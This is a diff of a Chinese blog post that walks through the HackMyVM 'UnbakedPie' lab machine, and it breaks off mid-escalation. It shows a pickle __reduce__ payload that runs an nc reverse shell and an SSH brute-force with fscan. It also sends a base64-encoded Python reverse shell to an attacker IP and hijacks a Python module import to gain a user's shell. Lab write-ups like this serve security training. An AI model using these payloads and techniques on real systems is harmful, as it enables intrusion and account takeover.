@@ -17,17 +17,22 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="UnbakedPie项目地址：https:&#x2F;&#x2F;downloads.hackmyvm.eu&#x2F;alzheimer.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本">
+    <meta name="description" content="UnbakedPie项目地址：https:&#x2F;&#x2F;downloads.hackmyvm.eu&#x2F;unbakedpie.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  反序列化Pickle 反序列化查看网页，当我们搜索一个东西后会看到有 search_cookie 参数  在网络请求中看响应  进行 Base64 解码 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MazeSec UnbakedPie">
 <meta property="og:url" content="http://example.com/2025/04/01/UnbakedPie/index.html">
 <meta property="og:site_name" content="雾島风起時">
-<meta property="og:description" content="UnbakedPie项目地址：https:&#x2F;&#x2F;downloads.hackmyvm.eu&#x2F;alzheimer.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本">
+<meta property="og:description" content="UnbakedPie项目地址：https:&#x2F;&#x2F;downloads.hackmyvm.eu&#x2F;unbakedpie.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  反序列化Pickle 反序列化查看网页，当我们搜索一个东西后会看到有 search_cookie 参数  在网络请求中看响应  进行 Base64 解码 1">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-04-01T09:33:00.000Z">
-<meta property="article:modified_time" content="2026-06-03T10:22:43.636Z">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a20da2c9ecef7401787c682.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a20da6a9ecef7401787c69a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a20da959ecef7401787c6b4.png">
+<meta property="article:published_time" content="2025-04-01T09:34:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T03:10:20.156Z">
 <meta property="article:author" content="ALL">
+<meta property="article:tag" content="Pickle 反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6a20da2c9ecef7401787c682.png">
     <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -145,7 +150,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnbakedPie"><span class="toc-number">1.</span> <span class="toc-text">UnbakedPie</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnbakedPie"><span class="toc-number">1.</span> <span class="toc-text">UnbakedPie</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.1.</span> <span class="toc-text">Pickle 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -222,8 +227,8 @@
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2025-04-01T09:33:00.000Z" itemprop="datePublished">2025-04-01</time>
-    <time style="display: none;" id="post-update-time">2026-06-03</time>
+    <time datetime="2025-04-01T09:34:00.000Z" itemprop="datePublished">2025-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-06-04</time>
   </span>
 </div>
 
@@ -232,33 +237,177 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="UnbakedPie"><a href="#UnbakedPie" class="headerlink" title="UnbakedPie"></a>UnbakedPie</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://downloads.hackmyvm.eu/alzheimer.zip">https://downloads.hackmyvm.eu/alzheimer.zip</a></p>
+        <h1 id="UnbakedPie"><a href="#UnbakedPie" class="headerlink" title="UnbakedPie"></a>UnbakedPie</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://downloads.hackmyvm.eu/unbakedpie.zip">https://downloads.hackmyvm.eu/unbakedpie.zip</a></p>
 <p>是一个打包好的镜像文件</p>
 <p><strong>注意：导入 ova 时一定要选择我已移动，否则没网</strong></p>
 <p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/item/6a20da2c9ecef7401787c682.png"></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="Pickle-反序列化"><a href="#Pickle-反序列化" class="headerlink" title="Pickle 反序列化"></a>Pickle 反序列化</h3><p>查看网页，当我们搜索一个东西后会看到有 <code>search_cookie</code> 参数</p>
+<p><img src="https://pic1.imgdb.cn/item/6a20da6a9ecef7401787c69a.png"></p>
+<p>在网络请求中看响应</p>
+<p><img src="https://pic1.imgdb.cn/item/6a20da959ecef7401787c6b4.png"></p>
+<p>进行 Base64 解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80 04 95 07 00 00 00 00 00 00 00 8c 03 61 61 61 91 6e</span><br></pre></td></tr></table></figure>
 
+<p>扔给 AI 梭哈，Pickle 反序列化</p>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>字节</th>
+<th>Opcode</th>
+<th>含义</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><code>\x80</code></td>
+<td><code>PROTO</code></td>
+<td>协议版本标识</td>
+<td>声明使用 Pickle 协议版本 4</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>\x04</code></td>
+<td>(参数)</td>
+<td>版本号</td>
+<td>Protocol 4</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>\x95</code></td>
+<td><code>FRAME</code></td>
+<td>帧边界</td>
+<td>标志一个新帧开始（Protocol 4+ 特性）</td>
+</tr>
+<tr>
+<td>3-10</td>
+<td><code>\x07\x00\x00\x00\x00\x00\x00\x00</code></td>
+<td>(参数)</td>
+<td>帧长度</td>
+<td>8字节小端整数 &#x3D; 7（帧内数据长度）</td>
+</tr>
+<tr>
+<td>11</td>
+<td><code>\x8c</code></td>
+<td><code>SHORT_BINUNICODE</code></td>
+<td>短 Unicode 字符串</td>
+<td>后跟1字节长度 + UTF-8字符串</td>
+</tr>
+<tr>
+<td>12</td>
+<td><code>\x03</code></td>
+<td>(参数)</td>
+<td>字符串长度</td>
+<td>长度 &#x3D; 3</td>
+</tr>
+<tr>
+<td>13-15</td>
+<td><code>\x61\x61\x61</code></td>
+<td>(参数)</td>
+<td>字符串内容</td>
+<td>ASCII: <code>aaa</code></td>
+</tr>
+<tr>
+<td>16</td>
+<td><code>\x91</code></td>
+<td><code>MEMOIZE</code></td>
+<td>记忆化</td>
+<td>将栈顶对象存入 memo（优化重复引用）</td>
+</tr>
+<tr>
+<td>17</td>
+<td><code>\x2e</code></td>
+<td><code>STOP</code></td>
+<td>终止</td>
+<td>返回栈顶对象，结束反序列化</td>
+</tr>
+</tbody></table>
+<p>还原出 Python 代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化字符串 &quot;aaa&quot;</span></span><br><span class="line">payload = pickle.dumps(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 编码后存入 Cookie</span></span><br><span class="line">cookie_value = base64.b64encode(payload).decode()</span><br><span class="line"><span class="built_in">print</span>(cookie_value)  <span class="comment"># 输出: gASVBwAAAAAAAACMA2FhYZQu</span></span><br></pre></td></tr></table></figure>
+
+<p>当 Python 执行 <code>pickle.loads(data)</code> 时，它并不是在 “解析数据”，而是启动了一个 Pickle 虚拟机 (PVM)</p>
+<p>这是一个基于栈的执行环境，核心组件包括：</p>
+<ul>
+<li><p>指令流：待执行的 Pickle 字节码</p>
+</li>
+<li><p>栈：用于存放操作数、中间结果和最终还原的对象</p>
+</li>
+<li><p>记忆区：一个字典，用于缓存已经创建的对象，处理循环引用和优化重复对象</p>
+</li>
+</ul>
+<p>当 Pickle 尝试序列化一个对象时，对于基础数据类型 <code>(int, str, list)</code>，它可以直接记录其值</p>
+<p>但对于自定义类的实例或包含不可序列化状态（如文件句柄、Socket）的对象，Pickle 无法直接保存其内存状态</p>
+<p>此时，Pickle 会调用该对象的 <code>__reduce__()</code>（或 <code>__reduce_ex__()</code>）魔法方法，询问对象：”我该如何重建你？”</p>
+<p><code>__reduce__</code> 必须返回一个元组，最核心的结构是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># callable：一个可调用对象</span></span><br><span class="line">    <span class="comment"># args_tuple：传递给该可调用对象的参数元组</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">callable</span>, args_tuple)</span><br></pre></td></tr></table></figure>
+
+<p>当 PVM 遇到这种结构时，它会生成 <code>REDUCE</code> 指令，在反序列化阶段执行 <code>callable(*args_tuple)</code> 来 “复活” 该对象</p>
+<p>理解了 <code>__reduce__</code> 和 <code>REDUCE</code>，Pickle RCE 的攻击链就非常清晰了</p>
+<p>攻击者不需要序列化一个真实的复杂对象，只需要伪造一个 <code>__reduce__</code> 的返回值即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, os, base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;nc -e /bin/bash 192.168.125.4 9999&quot;</span>,))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gASVOgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xMjUuNCA5OTk5lIWUUpQu</span><br></pre></td></tr></table></figure>
+
+<p>抓取搜索的包，替换掉 Cookie 发包拿到 Shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>信息收集发现是在 Docker 容器中</p>
+<p>在站点目录中，发现一个数据库文件 <code>/home/site/db.sqlite3</code>，其中有很多用户</p>
+<p>但是密码是加密的，对其爆破 SSH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.17.0.1 -user ramsey</span><br></pre></td></tr></table></figure>
+
+<p>得到凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ramsey:12345678</span><br></pre></td></tr></table></figure>
+
+<p>由于靶机上并未部署 SSH 客户端，所以采用 fscan 内置的命令执行功能</p>
+<p>先准备好 Python 版本的反弹 Shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.125.4&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fscan -h 172.17.0.1 -user ramsey -<span class="built_in">pwd</span> <span class="string">&quot;12345678&quot;</span> -c <span class="string">&quot;echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTI1LjQiLDg4ODgpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h3><p>在家目录中看到 <code>/home/ramsey/vuln.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Header</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">header</span>():</span><br><span class="line">        banner = <span class="string">&#x27;&#x27;&#x27;\033[33m</span></span><br><span class="line"><span class="string">                                      (</span></span><br><span class="line"><span class="string">                                       )</span></span><br><span class="line"><span class="string">                                  __..---..__</span></span><br><span class="line"><span class="string">                              ,-=&#x27;  /  |  \  `=-.</span></span><br><span class="line"><span class="string">                             :--..___________..--;</span></span><br><span class="line"><span class="string">                              \.,_____________,./</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗</span></span><br><span class="line"><span class="string">██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝</span></span><br><span class="line"><span class="string">██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗</span></span><br><span class="line"><span class="string">██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║</span></span><br><span class="line"><span class="string">██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║</span></span><br><span class="line"><span class="string">╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝</span></span><br><span class="line"><span class="string">\033[m&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> banner</span><br><span class="line"></span><br><span class="line"><span class="comment">#Function Instructions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">instructions</span>():</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n\t\t\t&quot;</span>,<span class="number">9</span> * <span class="string">&quot;-&quot;</span> , <span class="string">&quot;WELCOME!&quot;</span> , <span class="number">9</span> * <span class="string">&quot;-&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;1. Calculator&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;2. Easy Calculator&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;3. Credits&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;4. Exit&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="number">28</span> * <span class="string">&quot;-&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">instructions2</span>():</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n\t\t\t&quot;</span>,<span class="number">9</span> * <span class="string">&quot;-&quot;</span> , <span class="string">&quot;CALCULATOR!&quot;</span> , <span class="number">9</span> * <span class="string">&quot;-&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;1. Add&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;2. Subtract&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;3. Multiply&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;4. Divide&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="string">&quot;5. Back&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\t\t\t&quot;</span>,<span class="number">28</span> * <span class="string">&quot;-&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">credits</span>():</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n\t\tHope you enjoy learning new things  - Ch4rm &amp; H0j3n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function Arithmetic</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to add two numbers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to subtract two numbers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subtract</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 - num2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to multiply two numbers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiply</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 * num2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to divide two numbers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 / num2</span><br><span class="line"><span class="comment"># Main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> header()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Variables</span></span><br><span class="line">        OPTIONS = <span class="number">0</span></span><br><span class="line">        OPTIONS2 = <span class="number">0</span></span><br><span class="line">        TOTAL = <span class="number">0</span></span><br><span class="line">        NUM1 = <span class="number">0</span></span><br><span class="line">        NUM2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(OPTIONS != <span class="number">4</span>):</span><br><span class="line">                instructions()</span><br><span class="line">                OPTIONS = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;\t\t\tEnter Options&gt;&gt;&quot;</span>))</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;\033c&quot;</span></span><br><span class="line">                <span class="keyword">if</span> OPTIONS == <span class="number">1</span>:</span><br><span class="line">                        instructions2()</span><br><span class="line">                        OPTIONS2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;\t\t\tEnter Options&gt;&gt;&quot;</span>))</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&quot;\033c&quot;</span></span><br><span class="line">                        <span class="keyword">if</span> OPTIONS2 == <span class="number">5</span>:</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                NUM1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;\t\t\tEnter Number1&gt;&gt;&quot;</span>))</span><br><span class="line">                                NUM2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;\t\t\tEnter Number2&gt;&gt;&quot;</span>))</span><br><span class="line">                                <span class="keyword">if</span> OPTIONS2 == <span class="number">1</span>:</span><br><span class="line">                                        TOTAL = add(NUM1,NUM2)</span><br><span class="line">                                <span class="keyword">if</span> OPTIONS2 == <span class="number">2</span>:</span><br><span class="line">                                        TOTAL = subtract(NUM1,NUM2)</span><br><span class="line">                                <span class="keyword">if</span> OPTIONS2 == <span class="number">3</span>:</span><br><span class="line">                                        TOTAL = multiply(NUM1,NUM2)</span><br><span class="line">                                <span class="keyword">if</span> OPTIONS2 == <span class="number">4</span>:</span><br><span class="line">                                        TOTAL = divide(NUM1,NUM2)</span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;\t\t\tTotal &gt;&gt; $&quot;</span>,TOTAL</span><br><span class="line">                <span class="keyword">if</span> OPTIONS == <span class="number">2</span>:</span><br><span class="line">                        animation = [<span class="string">&quot;[■□□□□□□□□□]&quot;</span>,<span class="string">&quot;[■■□□□□□□□□]&quot;</span>, <span class="string">&quot;[■■■□□□□□□□]&quot;</span>, <span class="string">&quot;[■■■■□□□□□□]&quot;</span>, <span class="string">&quot;[■■■■■□□□□□]&quot;</span>, <span class="string">&quot;[■■■■■■□□□□]&quot;</span>, <span class="string">&quot;[■■■■■■■□□□]&quot;</span>, <span class="string">&quot;[■■■■■■■■□□]&quot;</span>, <span class="string">&quot;[■■■■■■■■■□]&quot;</span>, <span class="string">&quot;[■■■■■■■■■■]&quot;</span>]</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&quot;\r\t\t\t     Waiting to extract...&quot;</span></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(animation)):</span><br><span class="line">                            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                            sys.stdout.write(<span class="string">&quot;\r\t\t\t&quot;</span> + animation[i % <span class="built_in">len</span>(animation)])</span><br><span class="line">                            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">                        LISTED = pytesseract.image_to_string(Image.<span class="built_in">open</span>(<span class="string">&#x27;payload.png&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                        TOTAL = <span class="built_in">eval</span>(LISTED)</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&quot;\n\n\t\t\tTotal &gt;&gt; $&quot;</span>,TOTAL</span><br><span class="line">                <span class="keyword">if</span> OPTIONS == <span class="number">3</span>:</span><br><span class="line">                        credits()</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>当 Python 解释器执行到这一行时，它需要定位并加载 <code>pytesseract</code> 模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br></pre></td></tr></table></figure>
+
+<p>我们可以创建一个恶意文件打环境变量劫持</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> pytesseract.py</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;import pty&quot;</span> &gt; pytesseract.py</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt;&gt; pytesseract.py</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -u oliver /usr/bin/python /home/ramsey/vuln.py</span><br></pre></td></tr></table></figure>
+
+<p>检查 oliver 用户权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">oliver@unbaked:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> oliver on unbaked:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User oliver may run the following commands on unbaked:</span><br><span class="line">    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py</span><br></pre></td></tr></table></figure>
+
+<p>查看源码</p>
